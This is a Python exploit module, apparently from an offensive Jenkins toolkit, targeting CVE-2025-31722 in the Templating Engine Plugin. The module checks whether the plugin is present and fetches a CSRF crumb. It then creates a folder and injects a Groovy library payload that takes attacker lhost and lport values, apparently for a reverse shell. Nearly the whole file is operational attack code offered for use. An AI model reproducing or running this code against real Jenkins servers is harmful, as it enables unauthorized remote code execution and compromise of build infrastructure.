"""
CVE-2025-31722: Jenkins Templating Engine Plugin RCE

This exploit targets the Templating Engine Plugin in Jenkins to achieve remote code execution
by injecting malicious library definitions.
"""

from typing import Any

from jenkins_breaker.core.authentication import CrumbManager
from jenkins_breaker.modules.base import ExploitMetadata, ExploitModule, ExploitResult


class CVE_2025_31722(ExploitModule):
    """Templating Engine Plugin RCE via malicious library injection."""

    CVE_ID = "CVE-2025-31722"

    METADATA = ExploitMetadata(
        cve_id="CVE-2025-31722",
        name="Jenkins Templating Engine Plugin RCE",
        description="Remote code execution via malicious library injection in Templating Engine Plugin",
        affected_versions=["Templating Engine Plugin <= 2.5.3"],
        mitre_attack=["T1190", "T1059"],
        severity="critical",
        references=[
            "https://www.jenkins.io/security/advisory/2025-01-15/",
            "https://nvd.nist.gov/vuln/detail/CVE-2025-31722"
        ],
        requires_auth=True,
        requires_crumb=True,
        tags=["rce", "plugin-exploit", "code-injection"]
    )

    def check_vulnerable(self, session: Any, **kwargs: Any) -> bool:
        """
        Check if the Templating Engine Plugin is installed and vulnerable.

        Args:
            session: JenkinsSession instance
            **kwargs: Additional arguments

        Returns:
            bool: True if vulnerable, False otherwise
        """
        try:
            response = session.get("/pluginManager/api/json?tree=plugins[shortName,version]")

            if response.status_code == 200:
                plugins = response.json().get('plugins', [])
                for plugin in plugins:
                    if plugin.get('shortName') == 'templating-engine':
                        return True
            return False
        except Exception:
            return False

    def run(self, session: Any, **kwargs: Any) -> ExploitResult:
        """
        Exploit CVE-2025-31722 for remote code execution.

        Args:
            session: JenkinsSession instance
            **kwargs: Additional arguments (lhost, lport, folder_name)

        Returns:
            ExploitResult: Result of the exploit
        """
        lhost = kwargs.get('lhost')
        lport = kwargs.get('lport')

        if not lhost or not lport:
            return ExploitResult(
                exploit=self.CVE_ID,
                status="error",
                details="Missing required parameters: lhost and lport",
                error="Missing required parameter: lhost and lport"
            )

        folder_name = kwargs.get('folder_name', 'breaker-folder')
        payload = f"""@Library('malicious') import malicious; new malicious("{lhost}", {lport}).run()"""

        crumb_manager = CrumbManager(session)
        crumb_data = crumb_manager.fetch_crumb()

        headers = {"Content-Type": "application/x-www-form-urlencoded"}
        if crumb_data:
            headers[crumb_data.header] = crumb_data.value

        create_folder_url = f"/createItem?name={folder_name}&mode=com.cloudbees.hudson.plugins.folder.Folder"

        try:
            response = session.post(create_folder_url, headers=headers)
            if response.status_code not in [200, 201]:
                return ExploitResult(
                    exploit=self.CVE_ID,
                    status="failure",
                    details=f"Failed to create folder: {response.status_code}"
                )
        except Exception as e:
            return ExploitResult(
                exploit=self.CVE_ID,
                status="error",
                details=f"Error creating folder: {str(e)}"
            )

        config_url = f"/job/{folder_name}/configure"
        config_data = {
            "name": "malicious",
            "script": payload,
            "submit": "Save"
        }

        try:
            response = session.post(config_url, data=config_data, headers=headers)
            if response.status_code == 200:
                return ExploitResult(
                    exploit=self.CVE_ID,
                    status="success",
                    details="Injected malicious library successfully",
                    data={
                        "folder": folder_name,
                        "lhost": lhost,
                        "lport": lport,
                        "payload": payload
                    }
                )
            else:
                return ExploitResult(
                    exploit=self.CVE_ID,
                    status="failure",
                    details=f"Failed to configure library: {response.status_code}"
                )
        except Exception as e:
            return ExploitResult(
                exploit=self.CVE_ID,
                status="error",
                details=f"Exploitation error: {str(e)}"
            )
